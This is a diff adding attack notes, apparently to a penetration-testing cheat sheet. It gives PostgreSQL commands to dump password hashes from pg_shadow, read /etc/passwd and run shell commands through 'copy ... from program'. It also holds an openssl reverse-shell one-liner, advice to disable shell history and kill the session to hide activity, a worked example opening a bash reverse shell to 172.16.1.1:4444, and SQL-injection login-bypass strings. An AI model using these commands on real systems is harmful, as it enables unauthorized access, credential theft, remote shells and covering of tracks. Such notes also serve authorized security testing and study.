@@ -554,6 +554,51 @@ use exploit/linux/postgres/postgres_payload
 use exploit/windows/postgres/postgres_payload
 ```
 
+psql -U <username> -h <IP> -d <database>
+select username, passwd from pg_shadow;
+select current_database();
+create table test (input TEXT); copy test from '/etc/passwd'; select input from test;
+
+psql -U postgres -h <IP>                       # Login with user 'postgres' and no password
+\l                                             # List databases
+\du                                            # List database users
+select pg_ls_dir('/etc');                      # List directory contents of /etc
+\c postgres                                    # Connect to the 'postgres' db
+\d                                             # List of tables
+
+create table tmp(data text);                   # Create a table called 'tmp'
+copy tmp(data) from program 'ls -l /home';     # Run a command in the shell and save the output
+select * from tmp;                             # Print the contents of the table
+
+copy tmp from '/etc/passwd';
+select * from tmp;
+
+delete from tmp;                               # Clear the table
+
+Replace 'ls -l /home' with whatever command you'd like to run.
+drop table tmp;
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+openssl s_client -quiet -connect <IP>:<port> | /bin/sh 2>&1 | openssl s_client -connect <IP>:<port>
+
+Make sure to `export HISTFILE=/dev/null` when you get on, and `kill -9 $$` when you get off.
+
+# Example
+
+psql -U postgres -h <target IP> platforms
+\c postgres
+create table redteam(data text);
+copy redteam from program 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1 &';
+------------------------------------------------------------------------------------------------------
+
+# SQL Injection
+
+'+OR+1=1--
+admin’;--
+‘ or 1=1--
+‘ or 2=2--
+‘ or 2-1=1--
+‘ or 2>1--
 
 
 
